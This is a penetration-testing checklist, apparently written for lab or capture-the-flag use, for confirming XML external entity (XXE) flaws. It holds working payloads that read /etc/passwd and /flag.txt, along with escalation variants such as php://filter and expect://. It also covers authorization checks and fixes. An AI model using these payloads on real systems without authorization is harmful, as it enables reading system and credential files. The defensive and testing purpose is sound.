# XXE XML Parser Recon Checklist

## Goal

Determine whether an XML parsing endpoint resolves external entities and achieve minimal proof through reflected output or controlled out-of-band exfiltration.

## 1. Scope Confirmation

- Confirm the target is a lab, owned app, in-scope target, or defensive review.
- Record the target host and time.
- Avoid copying live secrets, tokens, flags, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Goal file/path (if known):
```

## 2. Map The XML Surface

Find where XML enters the application:

- upload forms
- paste boxes
- SOAP/XML-RPC endpoints
- API bodies with `application/xml`
- JSON wrappers containing an `xml` field
- file imports for shipment/report/manifest data

Record:

```text
Submission endpoint:
Content-Type:
Wrapper format:
Reflected fields:
Error behavior:
Legacy XML hints:
```

## 3. Confirm Normal Parsing

Submit benign XML first:

```xml
<doc>
  <title>Hello</title>
  <body>Test</body>
</doc>
```

Record:

```text
Status:
Parser response shape:
Reflected fields:
Validation errors:
```

## 4. Test Inline External Entity In Reflected Fields

Try a direct file-read entity in each reflected field:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<doc>
  <title>&xxe;</title>
  <body>test</body>
</doc>
```

Also test:

- attribute values
- secondary elements
- namespaced elements if the app expects them

Record:

```text
Field tested:
Response changed: yes/no
Disclosure location:
Contents redacted summary:
```

## 5. Test Lab-Specific Target Paths

If the prompt names a file such as `/flag.txt`, test it directly:

```xml
<!ENTITY xxe SYSTEM "file:///flag.txt">
```

Record:

```text
Path:
Reflected field:
Result:
```

## 6. Handle Parser/Output Constraints

If direct reflection fails, test:

```text
php://filter/convert.base64-encode/resource=/path
expect://
http://127.0.0.1/
parameter entities
XInclude
different encodings
entity in non-reflected field that appears in errors
```

Record:

```text
Variant:
Why tested:
Result:
Next variant:
```

## 7. Escalate To Blind/OOB Only If Needed

Use out-of-band exfil only when:

- parsing succeeds
- no direct reflection exists
- errors do not disclose content

Record:

```text
OOB method:
Callback observed: yes/no
Exfiltrated data type:
```

## 8. Confirm Root Cause

Separate symptoms from cause:

```text
Legacy XML/DTD support enabled external resolution.
The confirmed bug is resolving attacker-controlled external entities during parse.
```

## 9. Fix Checklist

- Disable external entity resolution.
- Reject DOCTYPE for untrusted input.
- Avoid reflecting parsed XML values blindly.
- Isolate any required legacy XML mode to trusted integrations.
- Add regression tests for direct and blind XXE payloads.

## 10. Decision Checklist

- [ ] XML input path identified.
- [ ] Baseline parse confirmed.
- [ ] Inline external entity tested in reflected fields.
- [ ] Known target path tested if provided.
- [ ] Alternate encodings/filters considered when output breaks.
- [ ] Blind/OOB attempted only after direct reflection failed.
- [ ] Root cause documented as unsafe entity resolution.
- [ ] Reusable notes exclude live secrets, tokens, and flags.
